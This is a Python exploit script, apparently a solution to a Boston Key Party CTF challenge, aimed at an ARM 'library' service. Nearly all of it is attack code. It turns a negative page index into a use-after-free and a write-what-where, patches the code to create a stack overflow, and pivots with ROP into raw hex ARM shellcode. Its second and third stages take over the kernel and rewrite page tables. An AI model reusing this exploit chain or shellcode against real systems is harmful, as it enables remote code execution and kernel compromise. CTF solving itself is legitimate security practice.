from pwnlib import *
import time

# BkP{I saw ARM on your resume...}

# spin in place as a PoC
#shellcode = "\xfe\xff\xff\xea" 

# loads another stage
shellcode = "0000a0e310109fe5022aa0e3000000ef11ff2fe1feffffeafeffffea4cf54004".decode("hex")
#stage3 = open("raw").read()
#assert "\x01" not in stage3
#print stage3.encode("hex")
#exit()

# fix page tables, print flag
stage3 = "30009fe5020c40e22c109fe5001080e528009fe5020840e2411e41e2031041e24020a0e30000a0e130ff2fe10000a0e10000a0e1feffffea0003a0021304000464080300".decode("hex")


# from sploit.asm: exhaust mem, pwn kernel, read in more kernelmode code
stage2 = "f0109fe5f0209fe5002081e50267a0e3290000ebe4609fe5270000eb2860a0e3250000eb0400a0e3d4109fe5d4209fe50830a0e3000000ef000000ef0000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e10000a0e168209fe50278a0e364609fe5072042e00640a0e1024c44e212ff2fe10000a0e10400a0e330109fe53c209fe5007091e5027087e2007081e50630a0e1000000ef0000a0e1000050e30000001af3ffffea1eff2fe10000a0e10000a0e1c8f5480403030303020800004c144104c8f540049809030000020004".decode("hex")


assert len(stage2) <= 0x2000 
assert "\x01" not in stage2 # dunny why but it fucks up


#######################

def add(title, font, content):
	s.send("add\n")

	s.ru("\x00\x00\nTitle: ")
	s.send(title + "\n")

	s.ru("um pages: ")
	s.send("1\n")

	s.ru(" #1\nfont: ")
	s.send(font + "\n")

	s.ru("content: ")
	s.send(content + "\n")

	s.ru("library]$ ")


s = Socket(("localhost", 2323))
#s = Socket(("54.214.122.246", 8888))
#raw_input("> ")
s.ru("er@main]$ ")

s.send("library\n")
s.ru("library]$ ")

# the "1111" page
first_page_addr = 0x6400c30

content  = ""
content += pd(first_page_addr)
content  = content.ljust(0x20, "C")
content_addr = 0x64014e8

font = ""
font = font.ljust(0x20, "A")

title  = ""
title += pd(content_addr)
title  = title.ljust(0x20, "B")


# - create three books
add("0000", "1111", "2222")
add(title, font, content)
add("7777", "8888", "9999")

# - tear negative page -> we can choose the page pointer fully
# - use this to free a page from another book
s.send("edit\n")
s.ru("\nBook ID: ")
s.send("2\n")
s.ru("re a page\n")
s.send("x\n")
s.ru("Page #: ")
s.send("-36\n")


# - our fake pointer to it is zeroed, but there is still a normal pointer
# - edit a page in a different book -> strdup -> control the page
payload  = ""
payload += pd(0x4400884) # our write-what-where target
payload  = payload.ljust(0x30, "X")
s.send("edit\n")
s.ru("\nBook ID: ")
s.send("1\n")
s.ru("re a page\n")
s.send("t\n")
s.ru("ew Title: ")
s.send(payload + "\n")
s.ru("library]$ ")


# - edit the corrupted page -> write-what-where (via strlen)
s.send("edit\n")
s.ru("\nBook ID: ")
s.send("0\n")
s.ru("re a page\n")
s.send("p\n")
s.ru("Page #: ")
s.send("0\n")
s.ru("font: ")
s.send("aaaa\n")
s.ru("content: ")
s.send("\n")
time.sleep(0.3)
s.send("X\n") # bytes to write


# - now we've corrupted the code to give us a free stack buffer overflow!
# - exploit it to ROP to a place to read into the code segment

payload  = "A"*0x400
payload += pd(0x440f450) # r4
payload += pd(0xdeadbeef) # r5
payload += pd(0xdeadbeef) # r6
payload += pd(0x440f444) # pc

s.ru(" Pages: 1\n")
s.ru("library]$ ")
s.send("edit\n")
s.ru("\nBook ID: ")
s.send("1\n")
s.ru("re a page\n")

s.send(payload + "\n")

time.sleep(0.3)

# - our shellcode overwrites the normal code and we get RCE
s.send(shellcode + "\n")

time.sleep(0.3)


stage2  = stage2.ljust(0x1f00, 'A')


# addr: 0x441144c
#stage2 += "0c40 9fe5 0c20 9fe5 0240 44e0 0228 42e2 12ff 2fe1".replace(" ", "").decode("hex")
stage2 += "0c30 9fe5 0238 43e2 2010 a0e3 022c a0e3 33ff 2fe1".replace(" ", "").decode("hex")
stage2 += pd(0x30838)
#stage2 += pd(0x1030998)
#stage2 += pd(0x0030998)
#stage2 += pd(0xe59ff010)
#stage2 += pd(0xe59ff018)*2 + pd(0xeafffffe) + pd(0xe59ff014) + pd(0xe59ff014)
#stage2 += pd(0x440f5b4) # dest for svc

assert "\x01" not in stage2

stage2 += "\x00"

stage2  = stage2.ljust(0x2000, 'B')

s.send(stage2)

raw_input("> ")

s.send(stage3.ljust(0x200, 'C'))

s.interact()
